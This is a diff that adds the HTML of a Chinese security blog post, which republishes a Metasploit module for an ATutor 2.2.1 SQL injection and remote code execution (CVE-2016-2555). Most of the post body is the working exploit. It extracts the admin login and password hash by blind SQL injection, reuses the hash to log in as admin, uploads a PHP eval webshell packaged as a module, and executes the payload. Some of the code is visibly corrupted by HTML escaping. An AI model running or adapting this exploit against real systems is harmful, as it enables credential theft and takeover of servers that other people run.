@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="色魔科技,maniac," />
+
+
+
+
+
+  <link rel="alternate" href="/rss.xml" title="Lost Maniac" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Atutor是一款开源的“教学内容管理系统”（Learning Content Management System，简称LCMS）。采用PHP、MySQL，HTTP Web 服务器推荐使用Apache。 Atutor除了教学内容管理的功能，还包括了简化的论坛、聊天室等，另外通过模块安装，还可以扩展功能： EWiki，E">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATutor 2.2.1 注入漏洞">
+<meta property="og:url" content="http://maniac.vip/posts/423.html">
+<meta property="og:site_name" content="Lost Maniac">
+<meta property="og:description" content="Atutor是一款开源的“教学内容管理系统”（Learning Content Management System，简称LCMS）。采用PHP、MySQL，HTTP Web 服务器推荐使用Apache。 Atutor除了教学内容管理的功能，还包括了简化的论坛、聊天室等，另外通过模块安装，还可以扩展功能： EWiki，ErFurtWiki在Atutor的实现；ATalker，基于网页的文本朗读工具。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-11-16T07:57:27.134Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ATutor 2.2.1 注入漏洞">
+<meta name="twitter:description" content="Atutor是一款开源的“教学内容管理系统”（Learning Content Management System，简称LCMS）。采用PHP、MySQL，HTTP Web 服务器推荐使用Apache。 Atutor除了教学内容管理的功能，还包括了简化的论坛、聊天室等，另外通过模块安装，还可以扩展功能： EWiki，ErFurtWiki在Atutor的实现；ATalker，基于网页的文本朗读工具。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://maniac.vip/posts/423.html"/>
+
+
+
+
+
+  <title>ATutor 2.2.1 注入漏洞 | Lost Maniac</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?6ece9853dbf154aa223dfef063628fe2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lost Maniac</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人若无名便可专心练贱</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://maniac.vip/posts/423.html?day=20171116">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lost Maniac">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lost Maniac">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ATutor 2.2.1 注入漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-03-06T17:33:01+08:00">
+                2016-03-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web应用程序漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">Web应用程序漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web应用程序漏洞/远程执行/" itemprop="url" rel="index">
+                    <span itemprop="name">远程执行</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/posts/423.html?day=20171116#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/423.html?day=20171116" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Atutor是一款开源的“教学内容管理系统”（Learning Content Management System，简称LCMS）。采用PHP、MySQL，HTTP Web 服务器推荐使用Apache。</p>
+<p>Atutor除了教学内容管理的功能，还包括了简化的论坛、聊天室等，另外通过模块安装，还可以扩展功能：</p>
+<p>EWiki，ErFurtWiki在Atutor的实现；<br>ATalker，基于网页的文本朗读工具。<br>Atutor支持二十多种语言，包括中文，志愿者可以参加翻译等工作。</p>
+<p>下面漏洞利用代码基于metasploit平台</p>
+<p>使用方法：保存下面的代码，后缀名为.rb，然后放到metasploit脚本目录下，载入即可<a id="more"></a></p>
+<p>以下代码具有攻击性，只做技术交流使用，使用在已经授权的网站，如果出现任何违法行为，本站概不负责</p>
+<p><pre class="tab-convert:true lang:ruby decode:true">require ‘msf/core’</pre></p>
+<p>class Metasploit3 &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking</p>
+<p>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper</p>
+<p>  def initialize(info={})<br>    super(update_info(info,<br>      ‘Name’           =&gt; ‘ATutor 2.2.1 SQL Injection / Remote Code Execution’,<br>      ‘Description’    =&gt; %q{<br>         This module exploits a SQL Injection vulnerability and an authentication weakness<br>         vulnerability in ATutor. This essentially means an attacker can bypass authenication<br>         and reach the administrators interface where they can upload malcious code.</p>
+<pre><code>     You are required to login to the target to reach the SQL Injection, however this
+     can be done as a student account and remote registration is enabled by default.
+  },
+  &apos;License&apos;        =&amp;gt; MSF_LICENSE,
+  &apos;Author&apos;         =&amp;gt;
+    [
+      &apos;mr_me &amp;lt;steventhomasseeley[at]gmail.com&amp;gt;&apos;, # initial discovery, msf code
+    ],
+  &apos;References&apos;     =&amp;gt;
+    [
+      [ &apos;CVE&apos;, &apos;2016-2555&apos;  ],
+      [ &apos;URL&apos;, &apos;http://www.atutor.ca/&apos; ] # Official Website
+    ],
+  &apos;Privileged&apos;     =&amp;gt; false,
+  &apos;Payload&apos;        =&amp;gt;
+    {
+      &apos;DisableNops&apos; =&amp;gt; true,
+    },
+  &apos;Platform&apos;       =&amp;gt; [&apos;php&apos;],
+  &apos;Arch&apos;           =&amp;gt; ARCH_PHP,
+  &apos;Targets&apos;        =&amp;gt; [[ &apos;Automatic&apos;, { }]],
+  &apos;DisclosureDate&apos; =&amp;gt; &apos;Mar 1 2016&apos;,
+  &apos;DefaultTarget&apos;  =&amp;gt; 0))
+
+register_options(
+  [
+    OptString.new(&apos;TARGETURI&apos;, [true, &apos;The path of Atutor&apos;, &apos;/ATutor/&apos;]),
+    OptString.new(&apos;USERNAME&apos;, [true, &apos;The username to authenticate as&apos;]),
+    OptString.new(&apos;PASSWORD&apos;, [true, &apos;The password to authenticate with&apos;])
+  ],self.class)
+</code></pre><p>  end</p>
+<p>  def print_status(msg=’’)<br>    super(“#{peer} - #{msg}”)<br>  end</p>
+<p>  def print_error(msg=’’)<br>    super(“#{peer} - #{msg}”)<br>  end</p>
+<p>  def print_good(msg=’’)<br>    super(“#{peer} - #{msg}”)<br>  end</p>
+<p>  def check</p>
+<pre><code># the only way to test if the target is vuln
+begin
+  test_cookie = login(datastore[&apos;USERNAME&apos;], datastore[&apos;PASSWORD&apos;], false)
+rescue Msf::Exploit::Failed =&amp;gt; e
+  vprint_error(e.message)
+  return Exploit::CheckCode::Unknown
+end
+
+if test_injection(test_cookie)
+  return Exploit::CheckCode::Vulnerable
+else
+  return Exploit::CheckCode::Safe
+end
+</code></pre><p>  end</p>
+<p>  def create_zip_file<br>    zip_file      = Rex::Zip::Archive.new<br>    @header       = Rex::Text.rand_text_alpha_upper(4)<br>    @payload_name = Rex::Text.rand_text_alpha_lower(4)<br>    @plugin_name  = Rex::Text.rand_text_alpha_lower(3)</p>
+<pre><code>path = &quot;#{@plugin_name}/#{@payload_name}.php&quot;
+register_file_for_cleanup(&quot;#{@payload_name}.php&quot;, &quot;../../content/module/#{path}&quot;)
+
+zip_file.add_file(path, &quot;&amp;lt;?php eval(base64_decode($_SERVER[&apos;HTTP_#{@header}&apos;])); ?&amp;gt;&quot;)
+zip_file.pack
+</code></pre><p>  end</p>
+<p>  def exec_code<br>    send_request_cgi({<br>      ‘method’   =&gt; ‘GET’,<br>      ‘uri’      =&gt; normalize_uri(target_uri.path, “mods”, @plugin_name, “#{@payload_name}.php”),<br>      ‘raw_headers’ =&gt; “#{@header}: #{Rex::Text.encode_base64(payload.encoded)}rn”<br>    })<br>  end</p>
+<p>  def upload_shell(cookie)<br>    post_data = Rex::MIME::Message.new<br>    post_data.add_part(create_zip_file, ‘archive/zip’, nil, “form-data; name=”modulefile”; filename=”#{@plugin_name}.zip””)<br>    post_data.add_part(“#{Rex::Text.rand_text_alpha_upper(4)}”, nil, nil, “form-data; name=”install_upload””)<br>    data = post_data.to_s<br>    res = send_request_cgi({<br>      ‘uri’ =&gt; normalize_uri(target_uri.path, “mods”, “_core”, “modules”, “install_modules.php”),<br>      ‘method’ =&gt; ‘POST’,<br>      ‘data’ =&gt; data,<br>      ‘ctype’ =&gt; “multipart/form-data; boundary=#{post_data.bound}”,<br>      ‘cookie’ =&gt; cookie,<br>      ‘agent’ =&gt; ‘Mozilla’<br>    })</p>
+<pre><code>if res &amp;amp;&amp;amp; res.code == 302 &amp;amp;&amp;amp; res.redirection.to_s.include?(&quot;module_install_step_1.php?mod=#{@plugin_name}&quot;)
+   res = send_request_cgi({
+     &apos;method&apos; =&amp;gt; &apos;GET&apos;,
+     &apos;uri&apos;    =&amp;gt; normalize_uri(target_uri.path, &quot;mods&quot;, &quot;_core&quot;, &quot;modules&quot;, res.redirection),
+     &apos;cookie&apos; =&amp;gt; cookie,
+     &apos;agent&apos;  =&amp;gt; &apos;Mozilla&apos;,
+   })
+   if res &amp;amp;&amp;amp; res.code == 302 &amp;amp;&amp;amp; res.redirection.to_s.include?(&quot;module_install_step_2.php?mod=#{@plugin_name}&quot;)
+      res = send_request_cgi({
+        &apos;method&apos; =&amp;gt; &apos;GET&apos;,
+        &apos;uri&apos;    =&amp;gt; normalize_uri(target_uri.path, &quot;mods&quot;, &quot;_core&quot;, &quot;modules&quot;, &quot;module_install_step_2.php?mod=#{@plugin_name}&quot;),
+        &apos;cookie&apos; =&amp;gt; cookie,
+        &apos;agent&apos;  =&amp;gt; &apos;Mozilla&apos;,
+      })
+   return true
+   end
+end
+
+# auth failed if we land here, bail
+fail_with(Failure::Unknown, &quot;Unable to upload php code&quot;)
+return false
+</code></pre><p>  end</p>
+<p>  def get_hashed_password(token, password, bypass)<br>    if bypass<br>      return Rex::Text.sha1(password + token)<br>    else<br>      return Rex::Text.sha1(Rex::Text.sha1(password) + token)<br>    end<br>  end</p>
+<p>  def login(username, password, bypass)<br>    res = send_request_cgi({<br>      ‘method’   =&gt; ‘GET’,<br>      ‘uri’      =&gt; normalize_uri(target_uri.path, “login.php”),<br>      ‘agent’ =&gt; ‘Mozilla’,<br>    })</p>
+<pre><code>token = $1 if res.body =~ /) + &quot;(.*)&quot;);/
+cookie = &quot;ATutorID=#{$1};&quot; if res.get_cookies =~ /; ATutorID=(.*); ATutorID=/
+if bypass
+  password = get_hashed_password(token, password, true)
+else
+  password = get_hashed_password(token, password, false)
+end
+
+res = send_request_cgi({
+  &apos;method&apos;   =&amp;gt; &apos;POST&apos;,
+  &apos;uri&apos;      =&amp;gt; normalize_uri(target_uri.path, &quot;login.php&quot;),
+  &apos;vars_post&apos; =&amp;gt; {
+    &apos;form_password_hidden&apos; =&amp;gt; password,
+    &apos;form_login&apos; =&amp;gt; username,
+    &apos;submit&apos; =&amp;gt; &apos;Login&apos;
+  },
+  &apos;cookie&apos; =&amp;gt; cookie,
+  &apos;agent&apos; =&amp;gt; &apos;Mozilla&apos;
+})
+cookie = &quot;ATutorID=#{$2};&quot; if res.get_cookies =~ /(.*); ATutorID=(.*);/
+
+# this is what happens when no state is maintained by the http client
+if res &amp;amp;&amp;amp; res.code == 302
+   if res.redirection.to_s.include?(&apos;bounce.php?course=0&apos;)
+    res = send_request_cgi({
+      &apos;method&apos;   =&amp;gt; &apos;GET&apos;,
+      &apos;uri&apos;      =&amp;gt; normalize_uri(target_uri.path, res.redirection),
+      &apos;cookie&apos; =&amp;gt; cookie,
+      &apos;agent&apos; =&amp;gt; &apos;Mozilla&apos;
+    })
+    cookie = &quot;ATutorID=#{$1};&quot; if res.get_cookies =~ /ATutorID=(.*);/
+    if res &amp;amp;&amp;amp; res.code == 302 &amp;amp;&amp;amp; res.redirection.to_s.include?(&apos;users/index.php&apos;)
+       res = send_request_cgi({
+         &apos;method&apos;   =&amp;gt; &apos;GET&apos;,
+         &apos;uri&apos;      =&amp;gt; normalize_uri(target_uri.path, res.redirection),
+         &apos;cookie&apos; =&amp;gt; cookie,
+         &apos;agent&apos; =&amp;gt; &apos;Mozilla&apos;
+       })
+       cookie = &quot;ATutorID=#{$1};&quot; if res.get_cookies =~ /ATutorID=(.*);/
+       return cookie
+      end
+   else res.redirection.to_s.include?(&apos;admin/index.php&apos;)
+      # if we made it here, we are admin
+      return cookie
+   end
+end
+
+# auth failed if we land here, bail
+fail_with(Failure::NoAccess, &quot;Authentication failed with username #{username}&quot;)
+return nil
+</code></pre><p>  end</p>
+<p>  def perform_request(sqli, cookie)</p>
+<pre><code># the search requires a minimum of 3 chars
+sqli = &quot;#{Rex::Text.rand_text_alpha(3)}&apos;/**/or/**/#{sqli}/**/or/**/1=&apos;&quot;
+rand_key = Rex::Text.rand_text_alpha(1)
+res = send_request_cgi({
+  &apos;method&apos;   =&amp;gt; &apos;POST&apos;,
+  &apos;uri&apos;      =&amp;gt; normalize_uri(target_uri.path, &quot;mods&quot;, &quot;_standard&quot;, &quot;social&quot;, &quot;connections.php&quot;),
+  &apos;vars_post&apos; =&amp;gt; {
+    &quot;search_friends_#{rand_key}&quot; =&amp;gt; sqli,
+    &apos;rand_key&apos; =&amp;gt; rand_key,
+    &apos;search&apos; =&amp;gt; &apos;Search People&apos;
+  },
+  &apos;cookie&apos; =&amp;gt; cookie,
+  &apos;agent&apos; =&amp;gt; &apos;Mozilla&apos;
+})
+return res.body
+</code></pre><p>  end</p>
+<p>   def dump_the_hash(cookie)<br>    extracted_hash = “”<br>    sqli = “(select/<strong>/length(concat(login,0x3a,password))/</strong>/from/<strong>/AT_admins/</strong>/limit/<strong>/0,1)”<br>    login_and_hash_length = generate_sql_and_test(do_true=false, do_test=false, sql=sqli, cookie).to_i<br>    for i in 1..login_and_hash_length<br>       sqli = “ascii(substring((select/</strong>/concat(login,0x3a,password)/<strong>/from/</strong>/AT_admins/<strong>/limit/</strong>/0,1),#{i},1))”<br>       asciival = generate_sql_and_test(false, false, sqli, cookie)<br>       if asciival &gt;= 0<br>          extracted_hash &lt;&lt; asciival.chr<br>       end<br>    end<br>    return extracted_hash.split(“:”)<br>  end</p>
+<p>  def get_ascii_value(sql, cookie)<br>    lower = 0<br>    upper = 126<br>    while lower &lt; upper<br>       mid = (lower + upper) / 2<br>       sqli = “#{sql}&gt;#{mid}”<br>       result = perform_request(sqli, cookie)<br>       if result =~ /There are d entries./<br>        lower = mid + 1<br>       else<br>        upper = mid<br>       end<br>    end<br>    if lower &gt; 0 and lower &lt; 126<br>       value = lower<br>    else<br>       sqli = “#{sql}=#{lower}”<br>       result = perform_request(sqli, cookie)<br>       if result =~ /There are d entries./<br>          value = lower<br>       end<br>    end<br>    return value<br>  end</p>
+<p>  def generate_sql_and_test(do_true=false, do_test=false, sql=nil, cookie)<br>    if do_test<br>      if do_true<br>        result = perform_request(“1=1”, cookie)<br>        if result =~ /There are d entries./<br>          return true<br>        end<br>      else not do_true<br>        result = perform_request(“1=2”, cookie)<br>        if not result =~ /There are d entries./<br>          return true<br>        end<br>      end<br>    elsif not do_test and sql<br>      return get_ascii_value(sql, cookie)<br>    end<br>  end</p>
+<p>  def test_injection(cookie)<br>    if generate_sql_and_test(do_true=true, do_test=true, sql=nil, cookie)<br>       if generate_sql_and_test(do_true=false, do_test=true, sql=nil, cookie)<br>        return true<br>       end<br>    end<br>    return false<br>  end</p>
+<p>  def report_cred(opts)<br>    service_data = {<br>      address: rhost,<br>      port: rport,<br>      service_name: ssl ? ‘https’ : ‘http’,<br>      protocol: ‘tcp’,<br>      workspace_id: myworkspace_id<br>    }</p>
+<pre><code>credential_data = {
+  module_fullname: fullname,
+  post_reference_name: self.refname,
+  private_data: opts[:password],
+  origin_type: :service,
+  private_type: :password,
+  username: opts[:user]
+}.merge(service_data)
+
+login_data = {
+  core: create_credential(credential_data),
+  status: Metasploit::Model::Login::Status::SUCCESSFUL,
+  last_attempted_at: Time.now
+}.merge(service_data)
+
+create_credential_login(login_data)
+</code></pre><p>  end</p>
+<p>  def exploit<br>    student_cookie = login(datastore[‘USERNAME’], datastore[‘PASSWORD’], false)<br>    print_status(“Logged in as #{datastore[‘USERNAME’]}, sending a few test injections…”)<br>    report_cred(user: datastore[‘USERNAME’], password: datastore[‘PASSWORD’])</p>
+<pre><code>print_status(&quot;Dumping username and password hash...&quot;)
+# we got admin hash now
+credz = dump_the_hash(student_cookie)
+print_good(&quot;Got the #{credz[0]} hash: #{credz[1]} !&quot;)
+if credz
+  admin_cookie = login(credz[0], credz[1], true)
+  print_status(&quot;Logged in as #{credz[0]}, uploading shell...&quot;)
+  # install a plugin
+  if upload_shell(admin_cookie)
+    print_good(&quot;Shell upload successful!&quot;)
+    # boom
+    exec_code
+  end
+end
+</code></pre><p>  end<br>end<br>&nbsp;</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/408.html?day=20171116" rel="next" title="数据库/前台/后台（未完成）">
+                <i class="fa fa-chevron-left"></i> 数据库/前台/后台（未完成）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/454.html?day=20171116" rel="prev" title="windows AppLocker 执行保护绕过">
+                windows AppLocker 执行保护绕过 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Lost Maniac" />
+            
+              <p class="site-author-name" itemprop="name">Lost Maniac</p>
+              <p class="site-description motion-element" itemprop="description">随便写写</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/rss.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/MSG-maniac" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:semowansui@vip.qq.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://qs5.org/" title="青石坞" target="_blank">青石坞</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bejson.com/" title="bejson" target="_blank">bejson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.hellojava.com/" title="HelloJava" target="_blank">HelloJava</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2013 &mdash; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">色魔科技</span>
+
+  
+  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytjBrzIY';
+      var conf = 'e3ae49b68dbe1a48b4fee1de4e87cc06';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
